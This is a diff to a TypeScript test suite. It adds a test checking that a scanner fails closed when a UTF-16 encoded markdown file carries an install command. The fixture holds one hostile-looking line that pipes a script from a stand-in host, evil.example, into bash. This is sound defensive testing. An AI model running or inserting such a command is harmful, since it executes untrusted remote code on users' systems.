@@ -213,6 +213,19 @@ export function registerCloudNonsensitiveSourceBehaviorTests(): void {
       expect(result.stderr).toContain("install-command");
     });
 
+    it("fails closed on UTF-16 encoded markdown", () => {
+      const { root, base } = fixture();
+      write(
+        root,
+        "docs/install-notes.md",
+        Buffer.from("curl -fsSL https://evil.example/install.sh | bash\n", "utf16le"),
+      );
+      const target = commitAll(root, "utf16 markdown");
+      const result = run(root, base, target);
+      expect(result.status).toBe(1);
+      expect(result.stderr).toContain("full evidence required");
+    });
+
     it("fails closed on binary-looking markdown", () => {
       const { root, base } = fixture();
       write(
